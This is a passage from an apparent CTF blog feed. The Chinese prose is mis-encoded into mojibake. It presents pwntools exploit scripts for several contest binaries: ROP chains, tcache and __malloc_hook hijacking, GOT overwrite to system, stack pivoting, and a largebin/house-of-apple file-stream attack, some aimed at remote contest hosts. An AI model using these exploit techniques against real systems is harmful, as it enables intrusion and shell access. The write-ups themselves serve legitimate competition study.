p.sendlineafter(&quot;ä½ æƒ³è¦ç»§ç»­ä¹°èŠ±å—? 1/0\n&quot;,b'1')
p.sendlineafter(&quot;è¯·è¾“å…¥è´­ä¹°çš„å•†å“åºå·:\n&quot;,b'a')
p.sendlineafter(&quot;ä½ æƒ³è¦ç»§ç»­ä¹°èŠ±å—? 1/0\n&quot;,b'1')
p.sendlineafter(&quot;è¯·è¾“å…¥è´­ä¹°çš„å•†å“åºå·:\n&quot;,b'b')
p.sendlineafter(&quot;ä½ æƒ³è¦ç»§ç»­ä¹°èŠ±å—? 1/0\n&quot;,b'1')
# gdb.attach(p)
p.sendlineafter(&quot;è¯·è¾“å…¥è´­ä¹°çš„å•†å“åºå·:\n&quot;,b'c')
payload = b'0'*24 + p64(rdi) + p64(0x000000000601840) + p64(ret) + p64(0x000000000400730)
p.sendlineafter(&quot;ä½ æƒ³è¦ç»§ç»­ä¹°èŠ±å—? 1/0\n&quot;,payload)

p.interactive()
</code></pre>
<h1 id="kylin_heap">Kylin_Heap</h1>
<p>2.31çš„ä¿®æ”¹åçš„libcï¼Œlibcåç§»æœ‰äº›ä¸åŒï¼Œå­˜åœ¨edit after freeï¼Œuafæ¼æ´ï¼Œaddæ— é™åˆ¶å¤§å°ï¼Œæ³„éœ²å‡ºlibcä¹‹åç›´æ¥ä¿®æ”¹tcache binçš„nextæŒ‡é’ˆåŠ«æŒhook</p>
<pre><code>from pwn import *
context(arch='amd64', os='linux', log_level='debug')
r = process('./pwn')
#r = remote(&quot;8.147.134.241&quot;,45324)
e = ELF('./pwn')
libc = ELF('./libc-2.31-0kylin9.2k0.2.so')  # ubuntu22æ‰“æœ¬åœ°
#one = [0xe6c7e, 0xe6c81, 0xe6c84]
one = [0xe3afe, 0xe3b01, 0xe3b04]


def dbg():
    gdb.attach(r)


def cmd(choice):
    r.recvuntil(b'What will you do, adventurer? ')
    r.sendline(str(choice).encode())


def add(size, content=b'a'): #ä»0å¼€å§‹ æœ€å¤š20ä¸ªå †
    cmd(1)
    r.recvuntil(b'Enter the size of the block you wish to summon (1 to 1280 bytes): ')
    r.sendline(str(size).encode())
    r.recvuntil(b'bytes):\n')
    r.send(content)


def free(idx):
    cmd(2)
    r.recvuntil(b'Which block will you let go? Enter the index (0-19): ')
    r.sendline(str(idx).encode())


def show(idx):
    cmd(4)
    r.recvuntil(b&quot;Which block's secrets would you like to uncover? Enter the index (0-19): &quot;)
    r.sendline(str(idx).encode())


def edit(idx, content=b'deafbeef'):
    cmd(3)
    r.recvuntil(b'Which block would you like to rewrite? Enter the index (0-19): ')
    r.sendline(str(idx).encode())
    r.recvuntil(b'bytes):\n')
    r.send(content)


def exit():
    cmd(5)

add(0x20,b'a')#0
add(0x20,b'a')#1
add(0x418,b'a')#2
add(0x418,b'a')#3
add(0x418,b'a')#4
add(0x418,b'a')#5
free(2)
show(2)
r.recvuntil(&quot;Revealing the contents of block [2]:\n&quot;)
libcbase = u64(r.recv(6).ljust(8,b'\x00')) - 2018272
print(&quot;libc = &quot;,hex(libcbase))
free(0)
free(1)
show(1)
r.recvuntil(&quot;Revealing the contents of block [1]:\n&quot;)
heap_base = u64(r.recv(6).ljust(8,b'\x00')) - 0x6c0 + 1056
print(&quot;heap_base = &quot;,hex(heap_base))

hook = libcbase + libc.sym[&quot;__malloc_hook&quot;]
edit(1,p64(hook))
add(0x20,b'a')#6
add(0x20,p64(libcbase + one[1]))#7
cmd(1)
print(&quot;hook = &quot;,hex(hook))
# dbg()
r.recvuntil(b'Enter the size of the block you wish to summon (1 to 1280 bytes): ')
r.sendline(str(0x30).encode())

r.interactive()
</code></pre>
<h1 id="consumption">consumption</h1>
<p>ä¸€é“cJSONè§£æçš„å †é¢˜ï¼Œæ‹·æ‰“gptåå¯ä»¥æ•´å‡ºäº¤äº’æ•°æ®ç»“æ„<img src="https://l1u66.github.io//post-images/1726043609017.png" alt="" loading="lazy">è¿™é‡Œçš„a3æ˜¯ä¸såç§»0x500çš„v13å˜é‡ï¼Œsccanfå‡½æ•°å¯ä»¥æŠŠa1å†™å…¥åˆ°v13æŒ‡å‘çš„åœ°å€ä¸­å»ï¼Œç¨‹åºæ˜¯32ä½çš„ï¼Œæ­£å¥½ä»¥%dçš„å½¢å¼å¯ä»¥å†™å…¥ä¸€ä¸ªåœ°å€ï¼Œæ”»å‡»æ€è·¯æ˜¯åœ¨heap_listä¸­å†™å…¥printfçš„gotè¡¨ï¼Œä»è€Œæ³„éœ²å‡ºlibcï¼Œé€šè¿‡editå°†free_gotä¿®æ”¹æˆsystemï¼Œfreeä¸€ä¸ªå¸¦/bin/shçš„å †å—å³å¯å¾—åˆ°shell</p>
<pre><code>from pwn import *
context(arch='i386', os='linux', log_level='debug')
r = process('./pwn')
elf = ELF('./pwn')
libc=ELF(&quot;./libc-2.31.so&quot;)

one = [0xe6aee, 0xe6af1, 0xe6af4]

# {&quot;choice&quot;:&quot;3&quot;,&quot;idx&quot;:0,&quot;size&quot;:&quot;0x60&quot;,&quot;content&quot;:&quot;aaaa&quot;}



def dbg():
    gdb.attach(r)


def add(size, content):   # ä¸è¶…è¿‡0x400  ä¸‹æ ‡ä»0å¼€å§‹
    r.recvuntil(b'5.exit\t\n')
    r.sendline(b'{&quot;choice&quot;:&quot;1&quot;,&quot;idx&quot;:0,&quot;size&quot;:&quot;' + bytes(str(size),encoding=&quot;utf-8&quot;) + b'&quot;,&quot;content&quot;:&quot;' + content + b'&quot;}')

def delete(idx):
    r.recvuntil(b'5.exit\t\n')
    r.sendline('{&quot;choice&quot;:&quot;2&quot;,&quot;idx&quot;:' + str(idx) + ',&quot;size&quot;:&quot;&quot;,&quot;content&quot;:&quot;&quot;}')


def show(idx):
    r.recvuntil(b'5.exit\t\n')
    r.sendline('{&quot;choice&quot;:&quot;3&quot;,&quot;idx&quot;:' + str(idx) + ',&quot;size&quot;:&quot;&quot;,&quot;content&quot;:&quot;&quot;}')


def edit(idx, content=b'deafbeef'):
    r.sendlineafter(b&quot;5.exit\t\n&quot;,b'{&quot;choice&quot;:&quot;4&quot;,&quot;idx&quot;:1,&quot;size&quot;:&quot;&quot;,&quot;content&quot;:&quot;' + content + b'&quot;}')


heaplist=0x08051B10
add(8,b&quot;/bin/sh&quot;)
add(elf.got[&quot;printf&quot;], b&quot;A&quot;*0x4cc + p32(heaplist + 4))
show(1)
r.recv(0x8)
libc.address = u32(r.recv(4)) - libc.sym[&quot;printf&quot;]
print(&quot;libc.addressÂ =Â &quot;,hex(libc.address))

system = libc.sym[&quot;system&quot;]

edit(1,b&quot;A&quot; * 4 + p32(system))

delete(0)

r.interactive()
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[2024å¹´äº¬æ´¥å†€å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç½‘ç»œæ”»é˜²å¤§èµ›ï¼ˆé¦–å±Šï¼‰]]></title>
        <id>https://l1u66.github.io/post/2024-nian-jing-jin-ji-da-xue-sheng-xin-xi-an-quan-wang-luo-gong-fang-da-sai-shou-jie/</id>
        <link href="https://l1u66.github.io/post/2024-nian-jing-jin-ji-da-xue-sheng-xin-xi-an-quan-wang-luo-gong-fang-da-sai-shou-jie/">
        </link>
        <updated>2024-09-07T06:11:11.000Z</updated>
        <content type="html"><![CDATA[<h1 id="leak">leak</h1>
<p>ç¨‹åºæŠŠflagæ–‡ä»¶æ‰“å¼€ï¼Œç„¶åä¸€å­—èŠ‚ä¸€å­—èŠ‚æ¯”å¯¹ï¼ŒåŒ¹é…ä¸€å­—èŠ‚ä¹‹åæ‰ä¼šè¯»ä¸‹ä¸€ä¸ªï¼Œè¯»å–çš„ä½ç½®å’Œè¾“å…¥çš„æ•°æ®æŒ¨ç€ï¼Œåé¢å¯ä»¥ç›´æ¥å¸¦å‡ºæ¥ï¼Œåé¢å°±æ˜¯ä¸€å­—èŠ‚ä¸€å­—èŠ‚å¾—æ³„éœ²ï¼Œ<s>åƒåœ¾ç¯å¢ƒï¼Œæ•´ä¸€å †åƒåœ¾æ•°æ®ä¸çŸ¥é“å¹²å•¥ï¼Œå¦ä¸€é˜Ÿæ­»æ´»æ‰“ä¸å‡ºæ¥</s></p>
<pre><code>from pwn import *
context(arch='amd64', os='linux', log_level='debug')

flag = b&quot;flag{&quot;

while(1):
    print(&quot;flag : {}&quot;.format(flag))
    p = remote(&quot;119.23.41.54&quot;,35432)
    # p = process(&quot;./leak&quot;)
    pay = flag.ljust(40,b'c')
    p.sendlineafter(&quot;What's your name?&quot;,pay)
    # gdb.attach(p)
    p.sendlineafter(&quot;Please give me your flag:&quot;,pay)
    p.recvuntil(&quot;Sorry &quot;)
    p.recv(40)
    flag += p.recv(1)
    print(flag)
    # flag += chr(j)
    # print(&quot;flag : &quot;,flag)
    # log.success(&quot;{} pos : {} success&quot;.format(i,chr(j)))
    p.close()
p.interactive()
</code></pre>
<h1 id="likeputs">likeputs</h1>
<p>æ ˆæº¢å‡ºç­¾åˆ°é¢˜</p>
<pre><code>from pwn import *
context(arch='amd64', os='linux', log_level='debug')
p = remote(&quot;119.23.41.54&quot;,34005)
system = 0x000000000400540
cmd = 0x000000000400797
rdi = 0x0000000000400753
ret = 0x0000000000400506
p.sendafter(&quot;cat flag\n&quot;,b'a'*32 + p64(0) + p64(rdi) + p64(cmd) + p64(ret) + p64(system))
p.interactive()
</code></pre>
<h1 id="condition">Condition</h1>
<p>æ¡ä»¶ç«äº‰....freeç½®é›¶æ“ä½œåœ¨sleepåï¼Œå¯ä»¥è®¾æ³•æ„é€ uafï¼Œæœ¬åœ°æ³„éœ²å‡ºæ¥heapåŸºåœ°å€äº†ï¼Œè¿œç«¯æ³„éœ²ä¸å‡ºæ¥ï¼Œè¿˜ä¸ç»™è¿œç«¯liibcç‰ˆæœ¬ï¼Œæ— æ•Œäº†</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ç¾ŠåŸæ¯2024]]></title>
        <id>https://l1u66.github.io/post/yang-cheng-bei-2024/</id>
        <link href="https://l1u66.github.io/post/yang-cheng-bei-2024/">
        </link>
        <updated>2024-08-30T14:01:08.000Z</updated>
        <content type="html"><![CDATA[<p>æ¯”èµ›è¿™å¤©æ‚äº‹æœ‰ç‚¹å¤šï¼Œæ•´ä¸ªä¸‹åˆæ²¡æ‰“æˆï¼Œåªçœ‹äº†ä¸¤é“é¢˜ï¼Œå‡ºäº†ä¸€é“ï¼Œå¦ä¸€é“æœ¬åœ°é€šäº†ï¼Œè¿œç«¯ä¸€åˆ°æœ€åè¾“å…¥ä¼ªé€ çš„ioæ—¶æŒ‚æ‰ï¼ŒçŒœæµ‹æ˜¯å› ä¸ºè¾“å…¥ç¼“å†²åŒºè¢«å¡«æ»¡å¯¼è‡´æå‰flushäº†ï¼Œä¸‹é¢ç»™å‡ºçš„æ˜¯èµ›åæ”¹å–„åçš„expï¼Œå¯æƒœæ²¡æœ‰ç¯å¢ƒæ£€éªŒå“©(æ‚²</p>
<h1 id="pstack">pstack</h1>
<p>pwnçš„ç­¾åˆ°é¢˜ï¼Œæº¢å‡º16å­—èŠ‚çš„æ ˆè¿ç§»</p>
<pre><code>from pwn import *
from LibcSearcher import *
context(os=&quot;linux&quot;, arch=&quot;amd64&quot;)

p = process('./pwn')
#p = remote(&quot;139.155.126.78&quot;,32231)
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

bss = 0x000000000601010 + 0x800
leave_ret = 0x00000000004006da
vuln = 0x0000000004006C4
pop_rdi_ret = 0x0000000000400773
read_got = 0x000000000600FD8
puts_plt = 0x000000000400520
ret = 0x0000000000400506

gdb.attach(p)
payload = b'a' * 48 + p64(bss + 0x30) + p64(vuln)
p.sendafter(&quot;overflow?\n&quot;,payload)


payload = p64(bss - 0x100) + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(vuln) + p64(0) + p64(0x601810) + p64(leave_ret)
p.send(payload)

read_addr = u64(p.recv(6).ljust(8,b'\x00'))
print(hex(read_addr))

libc_base = read_addr - libc.symbols['read']
system_addr = libc_base + libc.symbols['system']
bin_addr = libc_base + next(libc.search(b'/bin/sh'))

print(&quot;base = &quot;,hex(libc_base))
print(&quot;read = &quot;,hex(libc.symbols['read']))
one = [0xebc81, 0xebc85, 0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]

payload = b'a' * 48 + p64(bss - 0x100 + 0x30) + p64(vuln)
p.send(payload)
payload = p64(bss - 0x100) + p64(pop_rdi_ret) + p64(bin_addr) + p64(ret) + p64(system_addr) + p64(vuln) + p64(0) + p64(bss - 0x100) + p64(leave_ret)
p.send(payload)
p.interactive()
</code></pre>
<h1 id="travelgraphorwçš„house-of-apple">TravelGraph(orwçš„house of apple)</h1>
<p>æ¼æ´ç‚¹æ˜¯uafï¼Œå¢åˆ æ”¹æŸ¥éƒ½æœ‰ï¼Œä½†æ˜¯editåªèƒ½ç”¨ä¸€æ¬¡è¿˜å¾—ç»•è¿‡ä¸€ä¸ªæ£€æŸ¥ï¼Œæ­£å¥½ç”¨æ¥largebin attack<br>
addå¯ä»¥ç”³è¯·0x510,0x520,0x530çš„å †å—ï¼Œå‡ºæ¥çš„chunké•¿è¿™æ ·<img src="https://l1u66.github.io//post-images/1725027045497.png" alt="" loading="lazy"><br>
æ¯ä¸ªåŠŸèƒ½éƒ½æ˜¯é€šè¿‡èµ·å§‹åœ°å’Œç»ˆç‚¹çš„æ•°å­—æ¥æŸ¥æ‰¾çš„ï¼Œä½†æ˜¯freeåæ­¤åŒºåŸŸä¼šè¢«è¦†ç›–ï¼Œæ‰€ä»¥æˆ‘åˆ©ç”¨uafçš„æ–¹æ³•æ˜¯unsortedbinçš„chunkåˆ†å‰²ï¼Œä»è€Œä¼ªé€ èµ·å§‹åœ°ï¼Œç»ˆç‚¹ï¼Œfarå’Œå·¥å…·ï¼Œå¹¶ä¸”æ³¨æ„ï¼Œeditçš„é•¿åº¦æ˜¯æ ¹æ®å·¥å…·çš„æ•°å­—è®¡ç®—çš„ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ä¼ªé€ å·¥å…·çš„æ•°å­—å®ç°ä¸€æ¬¡å¾ˆå¤§çš„å †æº¢å‡ºï¼Œåé¢å°±æ˜¯largebin attack+house of appleäº†</p>
<pre><code>from pwn import *
context(arch='amd64', os='linux', log_level='debug')
r = process('./pwn')
#r = remote(&quot;139.155.126.78&quot;,37421)
e = ELF('./pwn')
libc = ELF('./libc.so.6')  # ubuntu22æ‰“æœ¬åœ°

city = [b&quot;guangzhou&quot;, b&quot;nanning&quot;, b&quot;changsha&quot;, b&quot;nanchang&quot;, b&quot;fuzhou&quot;]


def dbg():
    gdb.attach(r)


def cmd(choice):
    r.recvuntil(b'5. Calculate the distance.\n')
    r.sendline(str(choice).encode())


def add1(start, stop, dis, content):
    cmd(1)
    r.recvuntil(b'car/train/plane?\n')
    r.sendline(b'car')
    r.recvuntil(b'Please input the city name\n')
    r.sendline(city[start])
    r.recvuntil(b'Please input the city name\n')
    r.sendline(city[stop])
    r.recvuntil(b'How far?\n')
    r.sendline(str(dis).encode())
    r.recvuntil(b'Note:\n')
    r.send(content)

def add2(start, stop, dis, content):
    cmd(1)
    r.recvuntil(b'car/train/plane?\n')
    r.sendline(b'train')
    r.recvuntil(b'Please input the city name\n')
    r.sendline(city[start])
    r.recvuntil(b'Please input the city name\n')
    r.sendline(city[stop])
    r.recvuntil(b'How far?\n')
    r.sendline(str(dis).encode())
    r.recvuntil(b'Note:\n')
    r.send(content)

def add3(start, stop, dis, content):
    cmd(1)
    r.recvuntil(b'car/train/plane?\n')
    r.sendline(b'plane')
    r.recvuntil(b'Please input the city name\n')
    r.sendline(city[start])
    r.recvuntil(b'Please input the city name\n')
    r.sendline(city[stop])
    r.recvuntil(b'How far?\n')
    r.sendline(str(dis).encode())
    r.recvuntil(b'Note:\n')
    r.send(content)


def delete(start, stop):
    cmd(2)
    r.recvuntil(b'Please input the city name\n')
    r.sendline(city[start])
    r.recvuntil(b'Please input the city name\n')
    r.sendline(city[stop])


def show(start, stop):
    cmd(3)
    r.recvuntil(b'Please input the city name\n')
    r.sendline(city[start])
    r.recvuntil(b'Please input the city name\n')
    r.sendline(city[stop])


def edit(start, stop, dis, content):
    cmd(4)
    r.recvuntil(b'Please input the city name\n')
    r.sendline(city[start])
    r.recvuntil(b'Please input the city name\n')
    r.sendline(city[stop])
    r.recvuntil(b'Which one do you want to change?\n')
    r.sendline(b'0')
    r.recvuntil(b'How far?\n')
    r.sendline(str(dis).encode())
    r.recvuntil(b'Note:\n')
    r.send(content)


def exit():
    cmd(5)
#   x/20gx  &amp;routes
add1(1,1,1000,b'flag\x00\x00\x00\x00')#1
add3(1,2,1000,b'a')#2
add1(2,2,1000,b'a')#3
delete(1,1)
add2(2,4,1000,b'a')#4
add1(1,1,1000,b'\x70')#5
show(1,1)
r.recvuntil(&quot;Note:&quot;)
heap_base = u64(r.recv(6).ljust(8,b'\x00')) - 0x1470
print(&quot;heap_base = &quot;,hex(heap_base))
delete(1,1)
delete(1,2)
add1(1,3,1000,b'a')#1
delete(1,3)
add3(1,4,1000,b'b'*0x510)#1
show(1,4)
r.recvuntil(&quot;Note:&quot;)
r.recv(0x510)
libc_base = u64(r.recv(6).ljust(8,b'\x00')) - 2206944
print(&quot;libc_base = &quot;,hex(libc_base))

delete(1,4)
add3(2,3,1000,b'a'*0x508 + p64(0x541) + p32(0) + p32(3) + p32(0x800) + p32(1000))#1
cmd(5)
r.recvuntil(b'Please input the city name\n')
r.sendline(b'nanchang')
add1(4,4,1000,b'k')#1
add3(1,1,1000,b'flag\x00\x00\x00\x00')#1

IO_list_all=libc_base+libc.symbols['_IO_list_all']
magic_gadget=libc_base+0x000000000016a06a
&quot;&quot;&quot;
&lt;svcudp_reply+26&gt;:    mov    rbp,QWORD PTR [rdi+0x48]
&lt;svcudp_reply+30&gt;:    mov    rax,QWORD PTR [rbp+0x18]
&lt;svcudp_reply+34&gt;:    lea    r13,[rbp+0x10]
&lt;svcudp_reply+38&gt;:    mov    DWORD PTR [rbp+0x10],0x0
&lt;svcudp_reply+45&gt;:    mov    rdi,r13
&lt;svcudp_reply+48&gt;:    call   QWORD PTR [rax+0x28]
&quot;&quot;&quot;
leave_ret=libc_base+0x000000000004da83
add_rsp_ret = libc_base+0x0000000000125b80
lock=libc_base+0x21ba60
pop_rdi=libc_base+0x000000000002a3e5
pop_rsi=libc_base+0x000000000002be51
pop_rdx_r12=libc_base+0x000000000011f2e7
pop_rax_ret=libc_base+0x0000000000045eb0
ret = libc_base+0x0000000000029139
syscall=libc_base+0x0000000000029db4
read_addr=libc_base+libc.symbols['read']
write_addr=libc_base+libc.symbols['write']
puts_addr=libc_base+libc.symbols['puts']
open_addr=libc_base+libc.symbols['open']

fake_io_file_addr = heap_base + 6576
setcontext = libc_base + libc.sym['setcontext']
system = libc_base + libc.sym['system']
_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']
lock = libc_base+0x1ee7d0

orw_addr = fake_io_file_addr + 632
#open orw_addr+16
orw = b'flag\x00\x00\x00\x00'
orw += p64(add_rsp_ret) + p64(add_rsp_ret) + p64(orw_addr-8) + p64(0) + p64(leave_ret) + p64(0)
orw += p64(pop_rdx_r12) + p64(0) + p64(fake_io_file_addr - 0x10)#fake io addr
orw += p64(pop_rdi) + p64(orw_addr+16-24)
orw += p64(pop_rsi) + p64(0)
orw += p64(pop_rax_ret) + p64(2)
orw += p64(open_addr)
#read
orw += p64(pop_rdi) + p64(3)
orw += p64(pop_rsi) + p64(orw_addr + 0x100)
orw += p64(pop_rdx_r12) + p64(0x50) + p64(0)
orw += p64(read_addr)
#puts
orw += p64(pop_rdi) + p64(orw_addr + 0x100)
orw += p64(puts_addr)

fake_io_file = p64(2206944+libc_base)*2 + p64(1) + p64(2) + p64(0)*3 + p64(orw_addr-8)
fake_io_file = fake_io_file.ljust(
    0xa0 - 0x10, b'\0') + p64(fake_io_file_addr + 0x100)  # _wide_data
fake_io_file = fake_io_file.ljust(
    0xc0 - 0x10, b'\0') + p64(0xffffffffffffffff)  # _mode
fake_io_file = fake_io_file.ljust(
    0xd8 - 0x10, b'\0') + p64(_IO_wfile_jumps)  # vtable
fake_io_file = fake_io_file.ljust(
    0x100 - 0x10 + 0xe0, b'\0') + p64(fake_io_file_addr + 0x200)
fake_io_file = fake_io_file.ljust(
    0x200 - 0x10, b'\0') + p64(0)*13 + p64(magic_gadget)
fake_io_file += orw


add1(3,3,1000,b'a')#1
add1(3,4,1000,b'a')#1
delete(2,4)
add3(1,1,1000,b'a')#1
delete(4,4)


cmd(4)
r.recvuntil(b'Please input the city name\n')
r.sendline(city[0])
r.recvuntil(b'Please input the city name\n')
r.sendline(city[3])
r.recvuntil(b'Which one do you want to change?\n')
r.sendline(b'0')
r.recvuntil(b'How far?\n')
r.sendline(b'0')
r.recvuntil(b'Note:\n')
r.send(p64(0) + p64(0x521) + fake_io_file.ljust(0x510,b'\x66') + p64(0x520) + p64(0x520) + b'c'*0x518 + p64(0x531) + p64(2208016 + libc_base)*2 + p64(9200 + heap_base) + p64(IO_list_all - 0x20))#
# r.send(p64(0) + p64(0x521) + b'b'*0x518 + p64(0x521) + b'c'*0x518 + p64(0x531) + p64(0)*3 + p64(IO_list_all - 0x20) + b'c'*0x500 + p64(0x530) + p64(0x540) + b'd'*0x530 + b&quot;  sh;&quot; )
add3(1,1,1000,b'a')#1
print(&quot;IO_list_all = &quot;,hex(IO_list_all))
print(&quot;magic_gadget = &quot;,hex(magic_gadget))
print(&quot;leave_ret = &quot;,hex(leave_ret))

# gdb.attach(r)


r.recvuntil(b'5. Calculate the distance.\n')
r.sendline(str(7).encode())
r.interactive()

# + p64(2208016 + libc_base)*2 + p64(6576 + heap_base) + p64(IO_list_all - 0x20)
</code></pre>
]]></content>
    </entry>
</feed>